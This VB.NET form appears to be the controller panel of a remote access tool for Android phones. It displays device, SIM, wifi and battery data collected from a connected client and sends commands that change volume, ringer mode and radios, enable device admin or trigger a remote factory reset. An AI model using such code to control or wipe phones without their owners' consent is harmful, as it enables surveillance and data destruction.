﻿Imports System.Text

Public Class Settings_Phone
    Dim imageList_0 As New ImageList()
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Sub Client_data(ByVal data As String)

        Try

            If data IsNot Nothing Then
            Dim Save_data As System.Text.StringBuilder = New System.Text.StringBuilder()
            Dim spl_ln() As String = {Form1.s.split_Line}
            Dim n() As String = data.Split(spl_ln, StringSplitOptions.RemoveEmptyEntries)

            DataGridView1.Rows.Clear()
            Save_data.AppendFormat("{0}", "## Phone Info ##" + vbNewLine)
            Dim lns() As String = n(0).Split({Form1.s.split_Ary}, StringSplitOptions.None)
            Dim iicons% = 0
            For Lln% = 0 To lns.Length - 1





                Select Case iicons
                    Case 0
                        DataGridView1.Rows.Add(imageList_0.Images(imageList_0.Images.IndexOfKey("-1".ToUpper)), lns(Lln))
                    Case 1
                        DataGridView1.Rows.Add(imageList_0.Images(imageList_0.Images.IndexOfKey("device".ToUpper)), lns(Lln))
                    Case 2
                        DataGridView1.Rows.Add(imageList_0.Images(imageList_0.Images.IndexOfKey("system".ToUpper)), lns(Lln))
                    Case 3
                        DataGridView1.Rows.Add(imageList_0.Images(imageList_0.Images.IndexOfKey("sim".ToUpper)), lns(Lln))
                    Case 4
                        DataGridView1.Rows.Add(imageList_0.Images(imageList_0.Images.IndexOfKey("wifi".ToUpper)), lns(Lln))
                    Case 5
                        DataGridView1.Rows.Add(imageList_0.Images(imageList_0.Images.IndexOfKey("battery".ToUpper)), lns(Lln))
                End Select



                If lns(Lln).StartsWith("#------------") And lns(Lln).EndsWith("------------#") Then
                    Dim clor As Color = Color.FromArgb(90, 111, 123)
                    DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(1).Style.BackColor = clor
                    DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(0).Style.BackColor = clor
                    DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(0).Style.SelectionBackColor = clor
                    DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(1).Style.SelectionBackColor = clor
                    DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(1).Style.ForeColor = Color.FromArgb(245, 248, 250)
                    DataGridView1.Rows(Me.DataGridView1.RowCount - 1).DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter




                    DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(0).Value = imageList_0.Images(imageList_0.Images.IndexOfKey("-1".ToUpper))

                    iicons += 1
                End If



                Save_data.AppendFormat("{0}", lns(Lln) + vbNewLine)
            Next









            Dim spl_Ary() As String = {Form1.s.split_Ary}
            Dim Ary() As String = n(1).Split(spl_Ary, StringSplitOptions.RemoveEmptyEntries)
            TrackBar1.Maximum = CInt(Ary(0))
            TrackBar1.Value = CInt(Ary(1))

            TrackBar2.Maximum = CInt(Ary(2))
            TrackBar2.Value = CInt(Ary(3))

            TrackBar3.Maximum = CInt(Ary(4))
            TrackBar3.Value = CInt(Ary(5))


            TrackBar4.Maximum = CInt(Ary(6))
            TrackBar4.Value = CInt(Ary(7))

            Save_data.AppendFormat("{0}", "## Votes and alerts ##" + vbNewLine + "Ringtone" + vbNewLine + CStr(Ary(1)) + "of" + CStr(Ary(0)))
            Save_data.AppendFormat("{0}", vbNewLine + "Media" + vbNewLine + CStr(Ary(3)) + "of" + CStr(Ary(2)))
            Save_data.AppendFormat("{0}", vbNewLine + "Notification" + vbNewLine + CStr(Ary(5)) + "of" + CStr(Ary(4)))
            Save_data.AppendFormat("{0}", vbNewLine + "System" + vbNewLine + CStr(Ary(7)) + "of" + CStr(Ary(6)))

            Dim spl_Ary1() As String = {Form1.s.split_Ary}
            Dim AryPar() As String = n(2).Split(spl_Ary1, StringSplitOptions.RemoveEmptyEntries)
            Label1.Text = AryPar(0)
            Label2.Text = AryPar(1)
            Label3.Text = AryPar(2)
            Label4.Text = AryPar(3)
            Label5.Text = AryPar(4)
            Label6.Text = AryPar(5)
            Label7.Text = AryPar(6)
            Label8.Text = AryPar(7)
            refvalues()

            Save_data.AppendFormat("{0}", vbNewLine + "## Phone bar ##" + vbNewLine + "normal=" + AryPar(0) + vbNewLine)
            Save_data.AppendFormat("{0}", "vibrate=" + AryPar(1) + vbNewLine)
            Save_data.AppendFormat("{0}", "silent=" + AryPar(2) + vbNewLine)
            Save_data.AppendFormat("{0}", "bluetooth=" + AryPar(3) + vbNewLine)
            Save_data.AppendFormat("{0}", "gps=" + AryPar(4) + vbNewLine)
            Save_data.AppendFormat("{0}", "mobile_data=" + AryPar(5) + vbNewLine)
            Save_data.AppendFormat("{0}", "wifi_connected=" + AryPar(6) + vbNewLine)
            Save_data.AppendFormat("{0}", "wifi_disconnected=" + AryPar(7) + vbNewLine)

            Dim spl_Ary2() As String = {Form1.s.split_Ary}
            Dim policyManager() As String = n(3).Split(spl_Ary1, StringSplitOptions.RemoveEmptyEntries)
            Dim str$ = policyManager(0)
            Label11.Text = str
            If str = "-1" Or str = "False" Then
                Panel4.Enabled = False
            Else
                Panel4.Enabled = True
            End If
            Save_data.AppendFormat("{0}", "## Device Policy Manager ##" + vbNewLine + str + vbNewLine)



            store_0.Save_0(Name_Client & Client_ID & "\" & "Settings", Save_data.ToString)
            Me.DataGridView1.ClearSelection()
        End If




        Catch ex As Exception

        End Try





    End Sub




    Private Sub Settings_Phone_Load(sender As Object, e As EventArgs) Handles MyBase.Load




        ContextMenuStrip1.Renderer = New Theme_0
        CopyToolStripMenuItem.Image = store_0.Bitmap_0("ctx_copy")



#Region " imageList Phone info "
        Dim b As Boolean = False
        Dim List_Files As String() = IO.Directory.GetFiles(Application.StartupPath & "\" & store_0.name_folder_app_resource & "\icons\phone_info\")
        Dim i As String
        For Each i In List_Files
            If b = False Then
                Me.icon_0.Width = Bitmap.FromFile(i).Size.Width
                imageList_0.ImageSize = New Size(Bitmap.FromFile(i).Size.Width, Bitmap.FromFile(i).Size.Height)
                imageList_0.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
                b = True
            End If
            Dim FilePath As String = i
            Dim directoryPath As String = IO.Path.GetFileNameWithoutExtension(FilePath)
            imageList_0.Images.Add(directoryPath.ToUpper, Bitmap.FromFile(i))
        Next
#End Region

        Me.Icon = store_0.icons_0("window")


        Button2.Image = store_0.Bitmap_0("normal")

        Button3.Image = store_0.Bitmap_0("vibrate")

        Button4.Image = store_0.Bitmap_0("silent")

        Button5.Image = store_0.Bitmap_0("bluetooth")

        Button6.Image = store_0.Bitmap_0("gps")

        Button7.Image = store_0.Bitmap_0("mobile_data")

        Button8.Image = store_0.Bitmap_0("wifi_connected")

        Button9.Image = store_0.Bitmap_0("wifi_disconnected")

        'RichTextBox1.ContextMenuStrip = store_0.ContextMenu1
        Dim title As String = String.Format(Text & " - Remote Address & Port: {0} Client Name: {1}", Client_remote_Address, Name_Client)
        Text = title


        Me.TabPage1.Text = "Phone Info"
        Me.TabPage2.Text = "Votes and alerts"
        Me.TabPage3.Text = "Phone bar"
        Me.TabPage4.Text = "Device Policy Manager"

    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Form1.s.Send(handle_Number_Client, "settings_phone" + Form1.s.SplitData)
    End Sub

    Private Sub refvalues()
        GroupBox1.Text = "Ringtone(" + CStr(TrackBar1.Value) + " of " + CStr(TrackBar1.Maximum) + ")"
        GroupBox2.Text = "Media(" + CStr(TrackBar2.Value) + " of " + CStr(TrackBar2.Maximum) + ")"
        GroupBox3.Text = "Notification(" + CStr(TrackBar3.Value) + " of " + CStr(TrackBar3.Maximum) + ")"
        GroupBox4.Text = "System(" + CStr(TrackBar4.Value) + " of " + CStr(TrackBar4.Maximum) + ")"
    End Sub

    Private Sub TrackBar1_MouseUp(sender As Object, e As MouseEventArgs) Handles TrackBar1.MouseUp

        Form1.s.Send(handle_Number_Client, "sound_control" + Form1.s.SplitData + "0" + Form1.s.SplitData + CStr(TrackBar1.Value))
    End Sub
    Private Sub TrackBar2_MouseUp(sender As Object, e As MouseEventArgs) Handles TrackBar2.MouseUp
        Form1.s.Send(handle_Number_Client, "sound_control" + Form1.s.SplitData + "1" + Form1.s.SplitData + CStr(TrackBar2.Value))
    End Sub
    Private Sub TrackBar3_MouseUp(sender As Object, e As MouseEventArgs) Handles TrackBar3.MouseUp
        Form1.s.Send(handle_Number_Client, "sound_control" + Form1.s.SplitData + "2" + Form1.s.SplitData + CStr(TrackBar3.Value))
    End Sub
    Private Sub TrackBar4_MouseUp(sender As Object, e As MouseEventArgs) Handles TrackBar4.MouseUp
        Form1.s.Send(handle_Number_Client, "sound_control" + Form1.s.SplitData + "3" + Form1.s.SplitData + CStr(TrackBar4.Value))
    End Sub

    Private Sub TrackBar1_KeyDown(sender As Object, e As KeyEventArgs) Handles TrackBar1.KeyDown
        e.Handled = True
    End Sub
    Private Sub TrackBar2_KeyDown(sender As Object, e As KeyEventArgs) Handles TrackBar2.KeyDown
        e.Handled = True
    End Sub
    Private Sub TrackBar3_KeyDown(sender As Object, e As KeyEventArgs) Handles TrackBar3.KeyDown
        e.Handled = True
    End Sub
    Private Sub TrackBar4_KeyDown(sender As Object, e As KeyEventArgs) Handles TrackBar4.KeyDown
        e.Handled = True
    End Sub

    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        refvalues()
    End Sub

    Private Sub TrackBar2_Scroll(sender As Object, e As EventArgs) Handles TrackBar2.Scroll
        refvalues()
    End Sub

    Private Sub TrackBar3_Scroll(sender As Object, e As EventArgs) Handles TrackBar3.Scroll
        refvalues()
    End Sub

    Private Sub TrackBar4_Scroll(sender As Object, e As EventArgs) Handles TrackBar4.Scroll
        refvalues()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Form1.s.Send(handle_Number_Client, "bar_control" + Form1.s.SplitData + "0")

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Form1.s.Send(handle_Number_Client, "bar_control" + Form1.s.SplitData + "1")
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Form1.s.Send(handle_Number_Client, "bar_control" + Form1.s.SplitData + "2")
    End Sub



    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        Form1.s.Send(handle_Number_Client, "bar_control" + Form1.s.SplitData + "3")
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        Form1.s.Send(handle_Number_Client, "bar_control" + Form1.s.SplitData + "4")
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        Form1.s.Send(handle_Number_Client, "device_policy_manager" + Form1.s.SplitData + "1")
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click

        If MessageBox.Show("Factory will be reset" + vbNewLine + "Are you sure the ?", store_0.name_prog, MessageBoxButtons.YesNo) = Windows.Forms.DialogResult.Yes Then
            Form1.s.Send(handle_Number_Client, "device_policy_manager" + Form1.s.SplitData + "0")
        Else
            Exit Sub
        End If
        'factory will be reset Are you sure the ?

    End Sub

    Private Sub DataGridView1_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DataGridView1.CellContentClick

    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Dim myCopy As System.Text.StringBuilder = New System.Text.StringBuilder()
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Dim p1$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value
                myCopy.Append(p1 + vbNewLine)
            Next
            If Not myCopy.ToString = Nothing Then
                Try
                    My.Computer.Clipboard.SetText(myCopy.ToString.Trim)
                Catch ex As Exception
                End Try
            End If

        End If

    End Sub

End Class